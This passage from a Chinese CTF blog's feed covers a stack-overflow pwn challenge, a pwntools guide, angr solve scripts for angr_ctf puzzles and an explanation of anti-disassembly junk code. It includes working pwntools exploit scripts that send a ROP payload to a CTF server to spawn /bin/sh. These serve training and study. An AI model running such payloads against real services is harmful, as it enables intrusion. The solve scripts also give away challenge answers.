c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jarvisoj_level1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf; <span class="comment">// [exp+0h] [ebp-88h]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>,&amp;buf);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>,&amp;buf,<span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    backdoor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序栈可执行,泄露buf地址,read函数存在栈溢出.</p><p><code>思路</code>:在buf出写shellcode,覆盖ret地址为buf</p><p>ret2syscall</p><p>ret2libc</p><p>ret2cus</p><p><code>第一次触发漏洞</code>，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)</p><p><code>第二个pwn的特点是</code>，我们需要去info leak 得到信息，然后计算system 的地址。</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><code>对抗DEP/NX保护技术</code></p><p>因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序，并且利用gadgets片段的ret，可以实现连续控制。</p><p>ROP攻击需要满足</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的gadgets以及相应gadgets的地址。</li></ul><p><code>ROP ret2libc</code></p><p>过程：</p><ul><li>构造栈结构</li><li>利用返回地址ret的跳转特点</li><li>不在栈中或bss端执行代码，而是在程序的可执行段寻找可以执行的小组件(gadget)</li><li>把小组件串起来，构造而成的就叫ROP链</li></ul><p><code>对抗ASLR/PIE保护技术</code></p><p>如果需要跳转的函数没有在程序里，libc里有。</p><p>但ASLR/PIE保护技术使得程序基地址和libc基地址每次加载不一样</p><p><code>思路</code></p><ul><li>泄露GOT表中某个函数的libc地址</li><li>在libc找到system和binsh的相对偏移</li><li>得到system和binsh的地址</li><li>构造ROP</li></ul><p>在执行了一次某函数之后，GOT表中就会把一个函数在程序中的终极偏移存起来</p><p>最终偏移 = libc基址 + 库捏函数的相对偏移</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ro&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ro&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;Can you give me some advise?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul = <span class="number">0x08048521</span> </span><br><span class="line">backdoor = <span class="number">0x080484F6</span></span><br><span class="line">start = <span class="number">0x080483E0</span>  </span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line"></span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(puts_plt)+ p32(main_plt) + p32(gets_got) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.blackbird.wang&#x27;</span>,<span class="number">9504</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ro&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;Can you give me some advise?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line"></span><br><span class="line">sys_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bss = <span class="number">0x0804A028</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804836d</span> <span class="comment">#ROPgadget</span></span><br><span class="line"></span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line"><span class="comment">#payload = &quot;a&quot;*0x28 + &quot;a&quot;*4 + p32(puts_plt)+ p32(main_plt) + p32(gets_got) </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) +  p32(sys_plt) + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(bss)</span><br><span class="line"><span class="comment"># get_plt :  返回地址 pop_ebx_ret : get后执行平衡堆栈 bss : gets参数 </span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWN漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnTools学习</title>
      <link href="/2021/12/07/PWN/python%E5%BA%93Pwntools/"/>
      <url>/2021/12/07/PWN/python%E5%BA%93Pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="PwnTools学习"><a href="#PwnTools学习" class="headerlink" title="PwnTools学习"></a>PwnTools学习</h1><p>做题发现好多方法不知道，得系统的看看<a href="http://pwntools.com/">Pwntools</a></p><p>持续更新……</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>本地用process(),远程用remote()。</p><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><p>recv，send</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">send(data) <span class="comment"># 发送数据</span></span><br><span class="line">sendline(data) <span class="comment"># 发送一行数据，相当于在末尾加\n</span></span><br><span class="line">recv(numd=<span class="number">4096</span>,timeout=default) <span class="comment"># 给出接收字节数,timeout指定超时</span></span><br><span class="line">recvuntil(delims, drop=<span class="literal">False</span>) <span class="comment"># 接收到delims的pattern</span></span><br><span class="line">recvline(keepends=<span class="literal">True</span>) <span class="comment"># 接收到\n，keepends指定保留\n</span></span><br><span class="line">recvall() <span class="comment"># 接收到EOF</span></span><br><span class="line">recvrepeat(timeout=default) <span class="comment"># 接收到EOF或timeout</span></span><br><span class="line">interactive() <span class="comment"># 与shell交互</span></span><br></pre></td></tr></table></figure><h2 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h2><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。</p><p>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;./filename&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># 函数地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br></pre></td></tr></table></figure><p>调试工具</p><ul><li>Linux下 可以使用binutils的objdump工具来查看目标文件内部结构</li><li>Linux下 还可以使用readelf来解析ELF文件</li></ul><p>ELF动态链接文件被称为动态共享对象，简称共享对象，它们一般都是以”.so”为拓展名的文件；而在Windows中，动态链接文件被称为动态链接库，他们通常就是平时常见的“.dll”为拓展名的文件。</p><p><code>GOT与PLT</code></p><p><code>全局偏移表(GOT)</code></p><p>对于类型三，我们需要用到代码地址无关（PIC）技术，基本的思想就是把跟地址相关部分放到数据段里面。</p><p>ELF的做法是在数据段里建立一个指向这些变量的指针数据，称为全局偏移表（GOT），当代码需要引用该全局变量时，可以通过GOT中相对应的项间接引用。</p><p><code>延迟绑定（PLT）</code></p><p>动态链接以牺牲一部份性能为代价。PLT是另一种优化动态链接性能的方法。</p><p>在动态链接下，程序模块之间包含了大量的函数引用，所以在程序开始执行前，会耗费不少时间解决函数引用的符号查找以及重定位。<br>但是，在一个程序运行过程中，可能很多函数在程序执行完时都不会被用刀，比如一些错误处理函数。<br>所以ELF采用了一种叫做延迟绑定的做法。<br>基本思想:就是当函数第一次被用到时才进行绑定。如果没有用则不进行绑定，所以在开始时模块间的函数调用都没有进行绑定，而是需要用到时才绑定。</p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>主要是对整数进行打包，就是转换成二进制，比如转换成地址。p32、p64是打包，u32、u64是解包。</p><h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>DynELF是leak信息的神器。前提条件是要提供一个输入地址，输出此地址最少1byte数的函数。官网给出的说明是：Given a function which can leak data at an arbitrary address, any symbol in any loaded library can be resolved.</p><p><strong>参考文章</strong></p><ul><li><p><a href="http://pwntools.com/">Pwntools</a></p></li><li><p><a href="https://www.cnblogs.com/Ox9A82/p/5728149.html">CTF常用python库PwnTools的使用学习</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Angr介绍</title>
      <link href="/2021/12/07/Re/tool%E4%BB%8B%E7%BB%8D/Angr/"/>
      <url>/2021/12/07/Re/tool%E4%BB%8B%E7%BB%8D/Angr/</url>
      
        <content type="html"><![CDATA[<h1 id="Angr介绍"><a href="#Angr介绍" class="headerlink" title="Angr介绍"></a>Angr介绍</h1><ul><li>angr 来源于CGC项目，最初用于自动攻防。</li><li>平台无关(platform-agnostic)的二进制分析框架</li><li>( Computer Security Lab ) UCSB，Shellphish</li></ul><h2 id="Angr可以干什么？"><a href="#Angr可以干什么？" class="headerlink" title="Angr可以干什么？"></a>Angr可以干什么？</h2><ul><li>Disassembly and intermediate-representation lifting</li><li>Program instrumentation(程序检测)</li><li>符号执行</li><li>Control-flow analysis/控制流分析</li><li>Data-dependency analysis</li><li>Value-set analysis (VSA)</li><li>使用<strong>angrop</strong>自动构建ROP链</li><li>使用<strong>patcherex</strong>自动进行二进制强化</li><li>使用<strong>rex</strong>自动生成漏洞利用程序（用于DECREE和简单的Linux二进制程序）</li><li>使用<strong>angr-management</strong>（一个angr的GUI）来分析二进制程序</li></ul><p>符号执行</p><ul><li>在执行程序时用符号代替真实值。符号执行的优点在于，当使用真实值执行程序路径只有一条，而使用符号执行时，由于符号可变，我们可以利用这一特性，尽可能将程序的每一条路径遍历，这样的话，必定存在至少一条路径遍历的正确路径，每一个结果都可以表示为一个离散关系式，使用约束求解引擎即可分析出正确结果</li></ul><h2 id="Angr接口"><a href="#Angr接口" class="headerlink" title="Angr接口"></a>Angr接口</h2><p>加载</p><blockquote><p>angr.Project(‘filename’)</p></blockquote><p>属性 , CPU架构, 文件名 , 入口地址</p><blockquote><p>proj.arch</p><p>proj.entry</p><p>proj.filename</p></blockquote><p>加载器 Loader</p><p>可以通过loader来查看二进制文件加载的共享库，以及执行对加载地址空间相关的基本查询。</p><blockquote><p>proj.loader</p><p>proj.loader.shared_objects</p><p>proj.loader.min_addr</p><p>proj.loader.max_addr</p><p>proj.loader.main_object 加载了多个二进制程序，这是主对象</p><p>proj.loader.main_object.execstack # 查询主对象是否开启了NX</p></blockquote><p>工厂对象（Factory）</p><p>1.Blocks</p><blockquote><p>block =proj.factory.block(proj.entry)  # 从程序的入口处提取一个代码块</p><p>block.pp() ``# 打印反汇编代码</p></blockquote><p>以下举例为<a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>的题目</p><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>使用Angr</p><blockquote><p>ipython</p><p>import angr</p><p>p= angr.Project(“./00_angr_find”)                             # 建立项目</p><p>init_state = p.factory.entry_state()                            # 初始化</p><p>sm = p.factory.simulation_manager(init_state)        # </p><p>sm.explore(find=0x08048678)                                  # 该地址为跳转字符串的地址</p><p>found_state = sm.found[0]                                         </p><p>found_state.posix.dumps(0)                                     #找到对应的输入</p></blockquote><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">name = sys.argv[<span class="number">1</span>]</span><br><span class="line">p=angr.Project(name,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state=p.factory.entry_state()</span><br><span class="line"><span class="comment">#state=p.factory.blank_state() #no-initalize</span></span><br><span class="line"><span class="comment">#state=p.factory.full_init__state() #full-initalize</span></span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line"><span class="comment"># simgr=p.factory.simgr(state)</span></span><br><span class="line"></span><br><span class="line">Find = <span class="number">0x80485E0</span></span><br><span class="line">Avoid = <span class="number">0x80485EF</span></span><br><span class="line"></span><br><span class="line">res=sm.explore(find=Find,avoid=Avoid)</span><br><span class="line"><span class="built_in">print</span> (res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#HUJOZMYS</span></span><br></pre></td></tr></table></figure><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    p = angr.Project(bin_path)</span><br><span class="line">    init_state = p.factory.entry_state()</span><br><span class="line">    sm = p.factory.simulation_manager(init_state)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Solation &#123;&#125;&quot;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line">~                      </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p=angr.Project(<span class="string">&#x27;./attachment&#x27;</span>,load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">f=p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)<span class="comment">#设置state开始运行时的地址</span></span><br><span class="line">flag = claripy.BVS(<span class="string">&#x27;flag&#x27;</span>,<span class="number">8</span>*<span class="number">32</span>)<span class="comment">#要求的内容有32个，用BVS转成二进制给flag变量</span></span><br><span class="line">state.memory.store(<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span>,flag)<span class="comment">#因为程序没有输入，所以直接把字符串设置到内存</span></span><br><span class="line">state.regs.rdx=<span class="number">0x603055</span>+<span class="number">0x300</span></span><br><span class="line">state.regs.rdi=<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span><span class="comment">#然后设置两个寄存器</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)<span class="comment">#准备从state开始遍历路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)<span class="comment">#遍历到成功的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sucess&quot;</span>)</span><br><span class="line">    x=sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</code></p><p><code>workon angr</code></p><p><code>deactivate</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a></p></li><li><p><a href="https://bbs.pediy.com/thread-264775.htm">[原创]angr学习（一）</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2021/12/07/Re/reverse_obfuscation/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2021/12/07/Re/reverse_obfuscation/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p><code>花指令</code>是企图隐藏掉不想被逆向工程的代码块(或其它功能)的一种方法。</p><p>重点：<strong>构造永恒跳转，添加垃圾数据！</strong></p><h2 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h2><p>某字符串不想被逆向工程的时候，可能会试图隐藏掉该字符串，让IDA或者其他十六进制编辑器无法找到</p><p>下面介绍怎么去构造这样的字符串的实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov byte ptr [ebx], ’h’</span><br><span class="line">mov byte ptr [ebx+1], ’e’</span><br><span class="line">mov byte ptr [ebx+2], ’l’</span><br><span class="line">mov byte ptr [ebx+3], ’l’</span><br><span class="line">mov byte ptr [ebx+4], ’o’</span><br><span class="line">mov byte ptr [ebx+5], ’ ’</span><br><span class="line">mov byte ptr [ebx+6], ’w’</span><br><span class="line">mov byte ptr [ebx+7], ’o’</span><br><span class="line">mov byte ptr [ebx+8], ’r’</span><br><span class="line">mov byte ptr [ebx+9], ’l’</span><br><span class="line">mov byte ptr [ebx+10], ’d’</span><br></pre></td></tr></table></figure><p>当两个字符串进行比较的时候看起来是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, offset username</span><br><span class="line">cmp byte ptr [ebx], ’j’</span><br><span class="line">jnz fail</span><br><span class="line">cmp byte ptr [ebx+1], ’o’</span><br><span class="line">jnz fail</span><br><span class="line">cmp byte ptr [ebx+2], ’h’</span><br><span class="line">jnz fail</span><br><span class="line">cmp byte ptr [ebx+3], ’n’</span><br><span class="line">jnz fail</span><br><span class="line">jz it_is_john</span><br></pre></td></tr></table></figure><p>这种方法使得字符串不可能被分配到程序的代码段中。在某些场合可能会用到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(buf, &quot;%s%c%s%c%s&quot;, &quot;hel&quot;,’l’,&quot;o w&quot;,’o’,&quot;rld&quot;);</span><br></pre></td></tr></table></figure><p>代码看起来比较怪异，但是做为一个简单的防止逆向工程确实一个有用的方法。文本字符串也可能存在于加密的形式，那么所有字符串在使用前比较闲将字符串解密了。</p><h2 id="可执行代码"><a href="#可执行代码" class="headerlink" title="可执行代码"></a>可执行代码</h2><p>在程序可执行的情况下，增加一些操作，以便让IDA分辨不出</p><h3 id="插入垃圾"><a href="#插入垃圾" class="headerlink" title="插入垃圾"></a>插入垃圾</h3><p>可执行代码花指令的意思是在真实的代码中插入一些垃圾代码，但是保证原有程序的执行正确。</p><p>例1：花指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor esi, 011223344h ; garbage</span><br><span class="line">add esi, eax ; garbage</span><br><span class="line">add eax, ebx</span><br><span class="line">mov edx, eax ; garbage</span><br><span class="line">shl edx, 4 ; garbage</span><br><span class="line">mul ecx</span><br><span class="line">xor esi, ecx ; garbage</span><br></pre></td></tr></table></figure><p>这里的花指令使用原程序代码中没有使用的寄存器(ESI和EDX)。无论如何，增加花指令之后，原有的汇编代码变得更为枯涩难懂，从而达到不轻易被逆向工程的效果。</p><h3 id="替换同等功能"><a href="#替换同等功能" class="headerlink" title="替换同等功能"></a>替换同等功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov op1, op2可以替换为 push op2/pop op1这两条指令。</span><br><span class="line">jmp label可以替换为 push label/ret这两条指令，IDA将不会显示被引用的label。</span><br><span class="line">call label可以替换为push label_after_call_instruction/push label/ref这三条指令。</span><br><span class="line">push op可以替换为 sub esp, 4(或者8)/mov [esp], op这两条指令。</span><br></pre></td></tr></table></figure><h3 id="绝对执行或绝对不执行"><a href="#绝对执行或绝对不执行" class="headerlink" title="绝对执行或绝对不执行"></a>绝对执行或绝对不执行</h3><p>如果开发人员肯定ESI寄存器始终为0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    mov esi, 1</span><br><span class="line">    ... ; some code not touching ESI</span><br><span class="line">    dec esi</span><br><span class="line">    ... ; some code not touching ESI</span><br><span class="line">    cmp esi, 0</span><br><span class="line">    jz real_code</span><br><span class="line">    ;fakeluggage</span><br><span class="line">real_code:</span><br></pre></td></tr></table></figure><p>逆向工程需要一段时间才能够执行到real_code。这也被称为opaque predicate。 另一个例子(同上，假设可以肯定ESI寄存器始终为0):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add eax, ebx ; real code</span><br><span class="line">mul ecx ; real code</span><br><span class="line">add eax, esi ; opaque predicate. XOR, AND or SHL, etc, can be here instead of ADD.</span><br></pre></td></tr></table></figure><h3 id="打乱执行流程"><a href="#打乱执行流程" class="headerlink" title="打乱执行流程"></a>打乱执行流程</h3><p>例：如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">begin: </span><br><span class="line">    jmp ins1_label</span><br><span class="line">ins2_label: </span><br><span class="line">    instruction 2</span><br><span class="line">    jmp ins3_label</span><br><span class="line">ins3_label: </span><br><span class="line">    instruction 